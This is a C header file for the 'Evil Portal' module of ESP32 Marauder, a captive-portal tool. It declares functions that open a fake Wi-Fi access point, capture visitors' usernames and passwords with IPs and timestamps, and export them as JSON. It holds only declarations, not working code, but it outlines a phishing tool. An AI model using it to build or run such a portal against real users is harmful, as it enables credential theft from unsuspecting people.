/**
 * Evil Portal Module - ESP32 Marauder
 * Captive Portal with Credential Capture
 */

#ifndef EVIL_PORTAL_H
#define EVIL_PORTAL_H

#include <Arduino.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <LittleFS.h>

// Maximum credentials to store
#define MAX_CREDS 20

// LED Status Pin
#define LED_STATUS  32

// LED intervals (ms)
#define LED_FAST    250   // Heartbeat rápido (portal ativo)
#define LED_SLOW    1000  // Heartbeat lento (cliente conectado)

// Credential structure
struct Credential {
    String username;
    String password;
    String timestamp;
    String ip;
};

// Initialize Evil Portal
void evil_portal_init();

// Portal control
bool evil_portal_start(const char* ssid);
void evil_portal_stop();
bool evil_portal_is_running();

// Credential management
int evil_portal_get_cred_count();
Credential* evil_portal_get_cred(int index);
void evil_portal_clear_creds();
void evil_portal_list_creds();
// Export credentials as newline-delimited JSON objects to any Stream
void evil_portal_export_creds(Stream &out);

// Template management
bool evil_portal_set_template(const char* filename);
void evil_portal_list_templates();

// Status
void evil_portal_status();

// Must be called in loop()
void evil_portal_loop();

#endif // EVIL_PORTAL_H
